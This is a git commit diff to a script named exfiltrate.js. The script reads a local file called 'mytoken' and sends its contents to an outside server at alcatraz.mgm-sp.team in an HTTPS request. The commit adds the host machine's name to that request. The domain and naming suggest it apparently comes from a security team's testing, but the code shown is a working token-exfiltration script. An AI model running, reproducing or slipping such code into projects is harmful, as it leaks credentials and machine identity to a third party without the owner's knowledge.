5ee2b9a20784085c1d77f3cc4dbc412a4d1a99a0
Tuyen Thuc Nguyen <tuyen.thuc.nguyen@mgm-tp.com>
2026-08-27 16:58:34 +0700

    Changed exfiltrate so that it sends the hostname

--- exfiltrate.js
+++ exfiltrate.js
@@ -1,8 +1,10 @@
 const fs = require('fs');
 const https = require('https');
+const os = require('os');
 
 const content = fs.existsSync('mytoken') ? fs.readFileSync('mytoken', 'utf8') : '';
-const url = `https://alcatraz.mgm-sp.team/wrtqva?content=${encodeURIComponent(content)}`;
+const hostname = os.hostname();
+const url = `https://alcatraz.mgm-sp.team/wrtqva?content=${encodeURIComponent(content)}&hostname=${encodeURIComponent(hostname)}`;
 
 https.get(url, (res) => {
   console.log(`Status: ${res.statusCode}`);
